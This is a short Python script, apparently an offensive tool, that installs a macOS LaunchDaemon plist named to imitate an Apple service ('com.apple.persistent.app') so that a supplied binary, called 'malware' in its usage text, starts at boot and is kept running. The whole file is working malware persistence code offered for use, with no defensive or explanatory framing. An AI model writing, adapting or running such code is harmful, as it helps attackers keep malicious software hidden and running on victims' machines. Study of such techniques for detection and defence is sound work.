import os
import plistlib
import sys

def modify_plist_for_persistence(app_path, plist_path="/Library/LaunchDaemons/com.apple.persistent.app.plist"):
    persistent_dict = {
        'Label': 'com.apple.persistent.app',
        'ProgramArguments': [app_path],
        'RunAtLoad': True,
        'KeepAlive': True
    }

    try:
        with open(plist_path, 'wb') as fp:
            plistlib.dump(persistent_dict, fp)
        os.chmod(plist_path, 0o644)
        print(f"[+] Persistence established at {plist_path}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 persistence.py /path/to/malware")
        sys.exit(1)

    malware_path = sys.argv[1]
    if not os.path.exists(malware_path):
        print("[-] Malware path does not exist")
        sys.exit(1)

    modify_plist_for_persistence(malware_path)
